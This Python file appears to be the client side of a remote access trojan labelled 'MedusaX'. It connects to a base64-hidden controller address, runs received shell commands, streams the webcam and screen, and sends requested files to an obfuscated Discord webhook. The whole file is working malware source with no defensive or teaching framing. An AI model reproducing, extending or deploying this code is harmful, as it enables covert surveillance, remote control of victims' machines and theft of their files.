import socket
import subprocess
import cv2
import struct
import time
import requests
import os
import pyautogui
import numpy as np
import base64

server_ip = base64.b64decode("MTAuMC4xLjMz").decode()  # Encoded "10.0.1.33"
server_port = 9999
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, server_port))

def send_frame():
    global client
    cap = cv2.VideoCapture(0)

    while True:
        ret, frame = cap.read()
        if not ret:
            break

        _, encoded = cv2.imencode('.jpg', frame)
        client.sendall(struct.pack(">L", len(encoded)) + encoded.tobytes())

    cap.release()

def send_screen():
    global client

    while True:
        screenshot = pyautogui.screenshot()
        _, encoded = cv2.imencode('.jpg', cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR))
        client.sendall(struct.pack(">L", len(encoded)) + encoded.tobytes())

def obfuscate_string(input_string):
    """Encodes the given string in Base64."""
    return base64.b64encode(input_string.encode()).decode()

def deobfuscate_string(encoded_string):
    """Decodes the given Base64 encoded string."""
    return base64.b64decode(encoded_string.encode()).decode()

while True:
    try:
        command = client.recv(1024).decode().strip()

        if command.startswith("!"):
            # MedusaX Commands
            if command.startswith("!download"):
                filename = command.split(" ", 1)[1]
                if os.path.exists(filename):
                    with open(filename, "rb") as f:
                        webhook_url = deobfuscate_string("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyMTQxNDk1Njc1NDkzMTcyMy9SZ1JzQU0zYjU1QkFManhkd0JhZ0tlV3h3b25XbWNHXlljbjYwM0FQb6WZ3mdhrY8l7H3K0pd21MBM87K7BNhiQySyq2")  # Decoded webhook URL
                        requests.post(webhook_url, files={"file": f})

            elif command.startswith("!webcam_stream"):
                send_frame()

            elif command.startswith("!screen_stream"):
                send_screen()

            elif command.startswith("CTRL+P"):
                print("[ * ] Stopping stream...")
                break
        else:
            # Shell command execution
            output = subprocess.getoutput(command)
            client.send(output.encode())

    except Exception as e:
        print(f"[ - ] Error: {e}")
        break
